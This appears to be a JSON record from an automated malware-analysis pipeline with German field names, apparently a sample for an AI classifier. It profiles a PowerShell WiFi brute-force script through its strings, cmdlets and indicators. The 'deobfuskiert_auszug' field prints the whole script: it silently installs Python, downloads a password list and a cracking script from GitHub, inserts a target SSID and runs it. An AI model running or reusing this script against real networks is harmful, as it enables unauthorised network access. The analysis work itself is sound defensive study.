@@ -1,0 +1,116 @@
+{
+  "meta": {
+    "quelldatei": "tech_061_WifiBrute.ps1",
+    "sha256": "4d9b5bae39bd7a5a253602276a07b2bd963747090bbc2bd03bb1913b1bb7ab69",
+    "groesse_bytes": 1441,
+    "zeilen": 36,
+    "ground_truth_label": "techniques",
+    "analyse_gekuerzt": false,
+    "hinweis": "Kein Urteil enthalten. Bewertung erfolgt durch das LLM."
+  },
+  "stufe1_extract": {
+    "strings": [
+      "https://www.python.org/ftp/python/3.9.6/python-3.9.6-amd64.exe",
+      "$env:TEMP\\python-3.9.7-amd64.exe",
+      "/quiet InstallAllUsers=1 PrependPath=1",
+      "https://raw.githubusercontent.com/calinux-py/Python/main/WiFi%20Password%20Bruteforce/pass.txt",
+      "$env:TEMP\\pass.txt",
+      "$env:TEMP\\flipper.py",
+      "https://raw.githubusercontent.com/calinux-py/Python/main/WiFi%20Password%20Bruteforce/flipper.py",
+      "YOUR_SSID_HERE",
+      "$ssid",
+      "YOUR SSID"
+    ],
+    "string_anzahl_gesamt": 11,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0
+  },
+  "stufe2_features": {
+    "strings": [
+      "https://www.python.org/ftp/python/3.9.6/python-3.9.6-amd64.exe",
+      "$env:TEMP\\python-3.9.7-amd64.exe",
+      "/quiet InstallAllUsers=1 PrependPath=1",
+      "https://raw.githubusercontent.com/calinux-py/Python/main/WiFi%20Password%20Bruteforce/pass.txt",
+      "$env:TEMP\\pass.txt",
+      "$env:TEMP\\flipper.py",
+      "https://raw.githubusercontent.com/calinux-py/Python/main/WiFi%20Password%20Bruteforce/flipper.py",
+      "YOUR_SSID_HERE",
+      "$ssid",
+      "YOUR SSID"
+    ],
+    "string_anzahl_gesamt": 11,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0,
+    "beobachtete_cmdlets": [
+      "Get-Command",
+      "Get-Content",
+      "Invoke-WebRequest",
+      "Set-Content",
+      "Start-Process"
+    ],
+    "auffaellige_tokens": {
+      "invoke_webrequest": 3,
+      "start_process": 1
+    },
+    "iocs": {
+      "urls": [
+        "https://raw.githubusercontent.com/calinux-py/Python/main/WiFi%20Password%20Bruteforce/flipper.py",
+        "https://raw.githubusercontent.com/calinux-py/Python/main/WiFi%20Password%20Bruteforce/pass.txt",
+        "https://www.python.org/ftp/python/3.9.6/python-3.9.6-amd64.exe"
+      ],
+      "ipv4": [],
+      "pfade": [
+        "$env:TEMP\\flipper.py",
+        "$env:TEMP\\pass.txt",
+        "$env:TEMP\\python-3.9.7-amd64.exe"
+      ]
+    }
+  },
+  "stufe3_structure": {
+    "strings": [
+      "https://www.python.org/ftp/python/3.9.6/python-3.9.6-amd64.exe",
+      "$env:TEMP\\python-3.9.7-amd64.exe",
+      "/quiet InstallAllUsers=1 PrependPath=1",
+      "https://raw.githubusercontent.com/calinux-py/Python/main/WiFi%20Password%20Bruteforce/pass.txt",
+      "$env:TEMP\\pass.txt",
+      "$env:TEMP\\flipper.py",
+      "https://raw.githubusercontent.com/calinux-py/Python/main/WiFi%20Password%20Bruteforce/flipper.py",
+      "YOUR_SSID_HERE",
+      "$ssid",
+      "YOUR SSID"
+    ],
+    "string_anzahl_gesamt": 11,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0,
+    "beobachtete_cmdlets": [
+      "Get-Command",
+      "Get-Content",
+      "Invoke-WebRequest",
+      "Set-Content",
+      "Start-Process"
+    ],
+    "auffaellige_tokens": {
+      "invoke_webrequest": 3,
+      "start_process": 1
+    },
+    "iocs": {
+      "urls": [
+        "https://raw.githubusercontent.com/calinux-py/Python/main/WiFi%20Password%20Bruteforce/flipper.py",
+        "https://raw.githubusercontent.com/calinux-py/Python/main/WiFi%20Password%20Bruteforce/pass.txt",
+        "https://www.python.org/ftp/python/3.9.6/python-3.9.6-amd64.exe"
+      ],
+      "ipv4": [],
+      "pfade": [
+        "$env:TEMP\\flipper.py",
+        "$env:TEMP\\pass.txt",
+        "$env:TEMP\\python-3.9.7-amd64.exe"
+      ]
+    },
+    "deobfuskiert_auszug": "# Needs updating and fixing..\r\n\r\nfunction Crack-ssid {\r\n    param (\r\n        [Parameter(Mandatory = $true)]\r\n        [string]$ssid\r\n    )\r\n\r\n    # Step 1: Check if Python is installed\r\n    $pythonInstalled = Get-Command python -ErrorAction SilentlyContinue\r\n\r\n    if (-not $pythonInstalled) {\r\n        # Python is not installed, proceed with installation\r\n\r\n        # Download Python and pip\r\n        Invoke-WebRequest -Uri \"https://www.python.org/ftp/python/3.9.6/python-3.9.6-amd64.exe\" -OutFile \"$env:TEMP\\python-3.9.7-amd64.exe\"\r\n        Start-Process -FilePath \"$env:TEMP\\python-3.9.7-amd64.exe\" -ArgumentList \"/quiet InstallAllUsers=1 PrependPath=1\" -Wait\r\n    }\r\n\r\n    pip install comtypes pywifi\r\n    pip3 install comtypes pywifi\r\n\r\n    # Step 3: Download pass.txt file\r\n    Invoke-WebRequest -Uri \"https://raw.githubusercontent.com/calinux-py/Python/main/WiFi%20Password%20Bruteforce/pass.txt\" -OutFile \"$env:TEMP\\pass.txt\"\r\n\r\n    # Step 4: Download flipper.py file and amend the ssid\r\n    $pythonScriptPath = \"$env:TEMP\\flipper.py\"\r\n    Invoke-WebRequest -Uri \"https://raw.githubusercontent.com/calinux-py/Python/main/WiFi%20Password%20Bruteforce/flipper.py\" -OutFile $pythonScriptPath\r\n    (Get-Content -Path $pythonScriptPath) | ForEach-Object {$_ -replace \"YOUR_SSID_HERE\", \"$ssid\"} | Set-Content -Path $pythonScriptPath\r\n\r\n    # Step 5: Run the python script\r\n    python $pythonScriptPath\r\n}\r\n\r\n# Crack-ssid -ssid \"YOUR SSID\"\r\n",
+    "dekodierte_befehle": [],
+    "beobachtete_abfolge": [
+      "Web-Anfrage senden",
+      "Prozess starten"
+    ]
+  }
+}
